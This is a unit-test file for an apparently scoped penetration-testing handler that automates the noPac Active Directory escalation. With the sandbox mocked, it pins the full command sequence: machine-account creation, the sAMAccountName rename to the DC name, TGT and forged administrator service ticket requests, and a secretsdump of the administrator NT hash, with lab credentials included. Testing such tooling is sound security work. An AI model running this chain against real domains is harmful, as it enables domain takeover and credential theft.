"""Unit tests for the durable noPac (CVE-2021-42278/42287) handler.

The chain is six sandboxed steps; these tests pin the argv of every one of them
(with the sandbox mocked, no network), the LDIF that performs the rename, the
``KRB5CCNAME`` hand-off between the TGT and the forged service ticket, and the
fact that the NT hash never travels in the durable output/evidence: only a
workspace artifact plus its SHA-256 do.
"""

from __future__ import annotations

import asyncio
import contextlib
import hashlib
from pathlib import Path
from unittest import mock

import pytest

from nexus_core.kernel.models import Identity, RiskLevel, RunContext
from nexus_core.kernel.sandbox import SandboxResult
from nexus_core.tools.handlers import nopac as module
from nexus_core.tools.handlers.nopac import (
    build_rename_ldif,
    generate_machine_name,
    generate_machine_password,
    nopac_definition,
    nopac_handler,
    resolve_dc_names,
    validate_machine_name,
    validate_machine_password,
)

DC = "10.0.0.5"
DOMAIN = "windcorp.thm"
MACHINE = "OMNI1A2B$"
NT = "bfa4cae19504e0591ef0a523a1936cd4"

ADD_OK = f"[*] Successfully added machine account {MACHINE} with password OmniX.\n"
SEARCH_OK = "dn: CN=OMNI1A2B,CN=Computers,DC=windcorp,DC=thm\n\n"
LDAPMODIFY_OK = 'modifying entry "CN=OMNI1A2B,CN=Computers,DC=windcorp,DC=thm"\n'
TGT_OK = "Saving ticket in FIRE.ccache\n"
ST_OK = (
    "[*] Impersonating administrator\n"
    "[*] Requesting S4U2self\n"
    f"[*] Changing service from cifs/fire.windcorp.thm@WINDCORP.THM to cifs_{DC}@WINDCORP.THM\n"
    f"Saving ticket in administrator@cifs_{DC}@WINDCORP.THM.ccache\n"
)
DUMP_OK = (
    "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n"
    f"Administrator:500:aad3b435b51404eeaad3b435b51404ee:{NT}:::\n"
    "[*] Cleaning up... \n"
)
DELETE_OK = f"[*] Successfully deleted machine account {MACHINE}\n"


class QueueSandbox:
    """Return one queued result per ``run`` call and record argv + env."""

    def __init__(self, *results: SandboxResult, on_run=None):
        self.results = list(results)
        self.calls: list[list[str]] = []
        self.envs: list[dict] = []
        self._on_run = on_run

    async def run(self, argv, *, timeout_seconds: float = 30, **kwargs):
        self.calls.append(list(argv))
        self.envs.append(dict(kwargs.get("extra_env") or {}))
        if self._on_run is not None:
            self._on_run(list(argv), kwargs)
        if len(self.results) > 1:
            return self.results.pop(0)
        return self.results[0]


@contextlib.contextmanager
def _fake_sandbox(*results: SandboxResult, on_run=None):
    sandbox = QueueSandbox(*results, on_run=on_run)

    def factory(workspace_root, resolved=None, *extra):
        return sandbox

    with mock.patch.object(module, "ad_sandbox", factory), mock.patch.object(
        module, "resolve_impacket_binary", side_effect=lambda name: f"/usr/bin/impacket-{name}"
    ), mock.patch.object(
        module, "resolve_ad_binary", side_effect=lambda name: f"/usr/bin/{name}"
    ):
        yield sandbox


def _context() -> RunContext:
    return RunContext("system", Identity("op", "system", roles=("operator",)))


def _run(arguments: dict) -> object:
    return asyncio.run(nopac_handler(arguments, _context()))


def _args(**overrides) -> dict:
    arguments = {
        "target": DC,
        "domain": DOMAIN,
        "username": "edwardle",
        "password": "!Angelus25!",
        "dc_host": "FIRE",
        "machine_password": "OmniPass2026!",
        "computer_name": MACHINE,
    }
    arguments.update(overrides)
    return arguments


def _happy_artifacts(workspace: Path):
    """Create the files the real binaries would have written."""

    def on_run(argv, _kwargs):
        if argv[0].endswith("impacket-getTGT"):
            (workspace / "FIRE.ccache").write_text("tgt")
        if argv[0].endswith("impacket-getST"):
            (workspace / f"administrator@cifs_{DC}@WINDCORP.THM.ccache").write_text("st")

    return on_run


def _happy_path(tmp_path: Path) -> contextlib.AbstractContextManager[QueueSandbox]:
    results = [
        SandboxResult(0, ADD_OK, ""),
        SandboxResult(0, SEARCH_OK, ""),
        SandboxResult(0, LDAPMODIFY_OK, ""),
        SandboxResult(0, TGT_OK, ""),
        SandboxResult(0, LDAPMODIFY_OK, ""),
        SandboxResult(0, ST_OK, ""),
        SandboxResult(0, DUMP_OK, ""),
        SandboxResult(0, DELETE_OK, ""),
    ]
    return _fake_sandbox(*results, on_run=_happy_artifacts(tmp_path))


# ------------------------------------------------------------------ definition
def test_definition_is_high_risk_scoped_and_exploits():
    definition = nopac_definition()
    assert definition.tool_id == "nexus.attack.nopac"
    assert definition.risk is RiskLevel.HIGH
    assert definition.effect == "exploit"
    assert definition.scope_required is True
    assert definition.scope_target_field == "target"
    assert "CVE-2021-42278" in definition.description


def test_generated_names_and_passwords_satisfy_the_contract():
    assert validate_machine_name(generate_machine_name())
    assert validate_machine_password(generate_machine_password())
    with pytest.raises(ValueError):
        validate_machine_name("OMNI1A2B")  # no trailing $
    with pytest.raises(ValueError):
        validate_machine_name("A" * 15 + "$")
    with pytest.raises(ValueError):
        validate_machine_password("short")


def test_dc_names_are_derived_from_either_input():
    assert resolve_dc_names({"dc_host": "FIRE"}, DOMAIN) == ("FIRE", f"FIRE.{DOMAIN}")
    assert resolve_dc_names({"dc_fqdn": "fire.windcorp.thm"}, DOMAIN) == (
        "fire",
        "fire.windcorp.thm",
    )
    with pytest.raises(ValueError, match="dc_host or dc_fqdn"):
        resolve_dc_names({}, DOMAIN)


def test_ldif_rejects_unsafe_dn_and_value():
    ldif = build_rename_ldif("CN=OMNI1A2B,CN=Computers,DC=windcorp,DC=thm", "FIRE")
    assert ldif.endswith("sAMAccountName: FIRE\n")
    with pytest.raises(ValueError):
        build_rename_ldif("OU=evil", "FIRE")
    with pytest.raises(ValueError):
        build_rename_ldif("CN=x,DC=windcorp,DC=thm", "bad\nname")


# --------------------------------------------------------------------- handler
def test_happy_path_builds_every_step_and_verifies_with_the_dump(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    with _happy_path(tmp_path) as sandbox:
        result = _run(_args())

    add, search, rename, tgt, restore, getst, dump, delete = sandbox.calls
    assert add[0].endswith("impacket-addcomputer")
    assert add[add.index("-computer-name") + 1] == MACHINE
    assert add[add.index("-method") + 1] == "SAMR"
    assert add[-1] == f"{DOMAIN}/edwardle:!Angelus25!"
    assert search[0].endswith("ldapsearch")
    assert f"(sAMAccountName={MACHINE})" in search
    assert rename[0].endswith("ldapmodify")
    ldif = Path(rename[rename.index("-f") + 1]).read_text()
    assert "sAMAccountName: FIRE" in ldif
    assert tgt[1] == f"{DOMAIN}/FIRE:OmniPass2026!"  # TGT for the spoofed name
    assert tgt[tgt.index("-dc-ip") + 1] == DC
    assert "sAMAccountName: OMNI1A2B$" in Path(restore[restore.index("-f") + 1]).read_text()
    assert getst[getst.index("-impersonate") + 1] == "administrator"
    assert getst[getst.index("-altservice") + 1] == f"cifs/{DC}"
    assert getst[-1] == f"{DOMAIN}/cifs/FIRE.{DOMAIN}"
    assert "-k" in getst and "-no-pass" in getst
    assert dump[0].endswith("impacket-secretsdump")
    assert dump[dump.index("-just-dc-user") + 1] == "administrator"
    assert dump[-1] == f"{DOMAIN}/administrator@{DC}"
    assert delete[1] == "-delete"

    # The TGT ccache is handed to getST and secretsdump through KRB5CCNAME.
    assert sandbox.envs[5] == {"KRB5CCNAME": str(tmp_path / "FIRE.ccache")}
    assert sandbox.envs[6] == {
        "KRB5CCNAME": str(tmp_path / f"administrator@cifs_{DC}@WINDCORP.THM.ccache")
    }

    assert result.verified is True
    assert result.verification_method == "nopac_domain_admin_dumped"
    assert result.output["rid"] == 500
    assert result.output["cleanup"] is True
    dump_file = tmp_path / result.output["dump_file"]
    assert NT in dump_file.read_text()
    assert result.evidence["nt_sha256"] == hashlib.sha256(NT.encode()).hexdigest()
    # The credential itself never travels in the durable result.
    assert NT not in str(result.output) and NT not in str(result.evidence)
    assert "account_created" in result.evidence


def test_rename_failure_deletes_the_account_and_does_not_claim_success(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    denied = "ldap_modify: Insufficient access (50)\n"
    with _fake_sandbox(
        SandboxResult(0, ADD_OK, ""),
        SandboxResult(0, SEARCH_OK, ""),
        SandboxResult(1, denied, ""),
        SandboxResult(0, DELETE_OK, ""),
    ) as sandbox:
        result = _run(_args())

    assert result.verified is False
    assert result.verification_method == "nopac_rename_failed"
    assert "Insufficient access" in result.evidence["error"]
    assert sandbox.calls[3][1] == "-delete"
    assert not any(call[0].endswith("impacket-getTGT") for call in sandbox.calls)


def test_missing_dn_is_a_declared_negative(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    with _fake_sandbox(
        SandboxResult(0, ADD_OK, ""),
        SandboxResult(0, "", ""),
        SandboxResult(0, DELETE_OK, ""),
    ):
        result = _run(_args())
    assert result.verified is False
    assert result.verification_method == "nopac_ldapsearch_failed"


def test_failed_tgt_restores_the_machine_name_then_deletes(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    with _fake_sandbox(
        SandboxResult(0, ADD_OK, ""),
        SandboxResult(0, SEARCH_OK, ""),
        SandboxResult(0, LDAPMODIFY_OK, ""),
        SandboxResult(1, "", "KDC_ERR_C_PRINCIPAL_UNKNOWN"),
        SandboxResult(0, LDAPMODIFY_OK, ""),
        SandboxResult(0, DELETE_OK, ""),
    ) as sandbox:
        result = _run(_args())
    assert result.verification_method == "nopac_gettgt_failed"
    assert result.evidence["steps"] == [
        "addcomputer",
        "ldapsearch_dn",
        "rename_to_dc_name",
        "gettgt",
    ]
    assert "restore_machine_name" not in result.evidence["steps"]
    assert sandbox.calls[-2][0].endswith("ldapmodify")
    assert "sAMAccountName: OMNI1A2B$" in Path(
        sandbox.calls[-2][sandbox.calls[-2].index("-f") + 1]
    ).read_text()


def test_forged_ticket_without_a_dump_is_not_verified(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    results = [
        SandboxResult(0, ADD_OK, ""),
        SandboxResult(0, SEARCH_OK, ""),
        SandboxResult(0, LDAPMODIFY_OK, ""),
        SandboxResult(0, TGT_OK, ""),
        SandboxResult(0, LDAPMODIFY_OK, ""),
        SandboxResult(0, ST_OK, ""),
        SandboxResult(1, "", "Kerberos SessionError: KRB_AP_ERR_MODIFIED"),
        SandboxResult(0, DELETE_OK, ""),
    ]
    with _fake_sandbox(*results, on_run=_happy_artifacts(tmp_path)):
        result = _run(_args())
    assert result.verified is False
    assert result.verification_method == "nopac_escalation_unverified"
    assert "KRB_AP_ERR_MODIFIED" in result.evidence["error"]


def test_cleanup_disabled_keeps_the_account(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    results = [
        SandboxResult(0, ADD_OK, ""),
        SandboxResult(0, SEARCH_OK, ""),
        SandboxResult(0, LDAPMODIFY_OK, ""),
        SandboxResult(0, TGT_OK, ""),
        SandboxResult(0, LDAPMODIFY_OK, ""),
        SandboxResult(0, ST_OK, ""),
        SandboxResult(0, DUMP_OK, ""),
    ]
    with _fake_sandbox(*results, on_run=_happy_artifacts(tmp_path)) as sandbox:
        result = _run(_args(cleanup=False))
    assert result.verified is True
    assert result.output["cleanup"] is False
    assert not any("-delete" in call for call in sandbox.calls)


def test_hash_only_credentials_are_refused_for_the_ldap_rename(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    with (
        _fake_sandbox(SandboxResult(0, ADD_OK, "")),
        pytest.raises(ValueError, match="account password"),
    ):
        _run(_args(password=None, hash=f"aad3b435b51404eeaad3b435b51404ee:{NT}"))


def test_missing_binaries_are_reported_without_touching_the_target(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    with mock.patch.object(module, "resolve_impacket_binary", return_value=None), mock.patch.object(
        module, "resolve_ad_binary", return_value=None
    ):
        result = _run(_args())
    assert result.verified is False
    assert result.verification_method == "nopac_unavailable"
    assert "addcomputer" in result.output["missing"]


def test_handler_never_spawns_a_subprocess(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    with (
        _happy_path(tmp_path),
        mock.patch(
            "asyncio.create_subprocess_exec",
            side_effect=AssertionError("handler must not spawn subprocesses"),
        ),
    ):
        _run(_args())
